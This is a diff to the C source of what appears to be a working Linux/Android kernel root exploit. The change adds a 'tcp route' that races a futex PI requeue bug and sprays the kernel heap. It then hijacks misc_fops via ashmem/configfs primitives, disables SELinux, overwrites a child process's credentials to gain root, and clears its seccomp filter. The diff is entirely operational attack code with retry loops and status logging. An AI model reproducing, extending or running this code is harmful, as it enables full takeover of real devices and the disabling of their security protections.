@@ -218,10 +218,16 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
   if (tcp_route_selected()) {
+    /* rmp 6.1 order: hand the chain mutex back and let the owner finish
+     * BEFORE racing — the consumer's PI walk must see the post-unlock
+     * waiter state when it derefs the crafted waiter. */
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    while (!atomic_load(&owner_chain_done)) usleep(1000);
     do_tcp_fake_lock_route();
-  } else {
-    do_pselect_fake_lock_route();
+    atomic_store(&route_done, 1);
+    return NULL;
   }
+  do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -272,7 +278,9 @@ void *consumer_thread(void *arg __attribute__((unused))) {
                                 ? (calls_this_seq % 19) + 1
                                 : PSELECT_CONSUMER_NICE;
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
-        if (sched_ret != 0) {
+        /* tcp route: no LOCK_PI fallback — a real waiter enqueued next to
+         * the crafted one mid-route corrupts the PI tree. */
+        if (sched_ret != 0 && !tcp_route_selected()) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
           if (fret == 0) {
@@ -326,8 +334,13 @@ int run_main_route_threads(void) {
   pthread_join(owner, NULL);
   pthread_join(consumer, NULL);
 
-  return atomic_load(&consumer_calls) > 0 &&
-         atomic_load(&consumer_success) > 0 && route_last_step == 0;
+  int routed_ok = atomic_load(&consumer_calls) > 0 &&
+                  atomic_load(&consumer_success) > 0 && route_last_step == 0;
+  if (routed_ok && tcp_route_selected() && !cfi_acquired()) {
+    pr_warning("tcp route fired but cfi not acquired\n");
+    routed_ok = 0;
+  }
+  return routed_ok;
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
@@ -802,6 +815,30 @@ static int retry_write_stage(
   return 0;
 }
 
+/* tcp route W1: one race acquires the configfs primitives, SELinux flips
+ * through them. Retry = re-spray and re-race until acquire sticks. */
+static int tcp_acquire_stage(void) {
+  for (int attempt = 1; attempt <= 6; attempt++) {
+    pr_info("tcp acquire attempt %d/6\n", attempt);
+    if (attempt == 1) slab_drain();
+    clear_pselect_write();
+    page_base = prepare_good_kernel_page();
+    if (!page_base) {
+      pr_warning("  heap spray failed\n");
+      usleep(100000);
+      continue;
+    }
+    if (run_main_route_threads() && cfi_stage_selinux_off()) {
+      return 1;
+    }
+    /* Drop any partial hijack before re-spraying; a live misc_fops
+     * hijack across re-races corrupts the next acquire gate. */
+    cfi_release();
+    usleep(100000);
+  }
+  return 0;
+}
+
 static int verify_selinux_stage(void *context) {
   (void)context;
   if (!check_selinux_off()) return 0;
@@ -896,6 +933,13 @@ int run_exploit(int argc, char **argv) {
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
+  int tcp_cfi = tcp_route_selected();
+  if (tcp_cfi && !cfi_symbols_present()) {
+    pr_error("tcp route selected but this kernel entry has no "
+             "ashmem/configfs symbols; rerun with GHOSTLOCK_TCP_ROUTE=0\n");
+    return 1;
+  }
+
   log_startup_context();
   init_p0_profile();
   pin_to_core(CORE);
@@ -912,11 +956,16 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
-    selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
-        verify_selinux_stage, NULL, 0);
+    if (tcp_cfi) {
+      selinux_ok = tcp_acquire_stage();
+    } else {
+      selinux_ok = retry_write_stage(
+          "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
+          verify_selinux_stage, NULL, 0);
+    }
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
+      cfi_release();
       return 1;
     }
     TIMER("Write 1 complete");
@@ -952,6 +1001,7 @@ int run_exploit(int argc, char **argv) {
     child = spawn_child(&pipes);
     if (child < 0) {
       pr_warning("fork failed\n");
+      cfi_release();
       return 1;
     }
 
@@ -965,7 +1015,7 @@ int run_exploit(int argc, char **argv) {
       pr_info("perf returned 0, retrying...\n");
       waitpid(child, NULL, 0);
       child = spawn_child(&pipes);
-      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
+      if (child < 0) { pr_warning("retry fork failed\n"); cfi_release(); return 1; }
       child_task = 0;
       read(pipes.task_r, &child_task, sizeof(child_task));
       close(pipes.task_r);
@@ -975,20 +1025,37 @@ int run_exploit(int argc, char **argv) {
       pr_warning("Cannot find task_struct (perf leak failed)\n");
       close(pipes.cmd_w);
       waitpid(child, NULL, 0);
+      cfi_release();
       return 1;
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
     pselect_child_node = 1;
 
-    int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
-        verify_w2_stage, &w2_context, 0);
+    int got_root;
+    if (tcp_cfi) {
+      /* configfs primitives write the child cred directly — no race
+       * needed, just verify the child actually went root. */
+      got_root = 0;
+      for (int attempt = 1; attempt <= 3 && !got_root; attempt++) {
+        pr_info("W2: cred (cfi) attempt %d/3\n", attempt);
+        if (!cfi_patch_child_cred(child_task)) {
+          usleep(50000);
+          continue;
+        }
+        got_root = verify_w2_stage(&w2_context);
+      }
+    } else {
+      got_root = retry_write_stage(
+          "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
+          verify_w2_stage, &w2_context, 0);
+    }
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 15 rounds\n");
+      pr_warning("W2 failed\n");
       waitpid(child, NULL, 0);
+      cfi_release();
       return 1;
     }
 
@@ -1001,6 +1068,19 @@ int run_exploit(int argc, char **argv) {
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
+      break;
+    }
+
+    if (tcp_cfi) {
+      /* configfs writes carry explicit addresses — no leaf-dir probe and
+       * no erase-side ambiguity; clear and probe once. */
+      seccomp_ok = cfi_stage_seccomp_clear(child_task) &&
+                   verify_seccomp_probe_stage(&w2_context);
+      if (!seccomp_ok) {
+        pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+        continue; /* respawn and redo the chain */
+      }
+      pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
       break;
     }
 
@@ -1062,6 +1142,10 @@ int run_exploit(int argc, char **argv) {
 
   if (!seccomp_ok)
     pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+
+  /* Stages done — restore misc_fops before handing off to the shell so
+   * the system keeps working ashmem. */
+  cfi_release();
 
   sleep(2);
   TIMER("exploit complete");
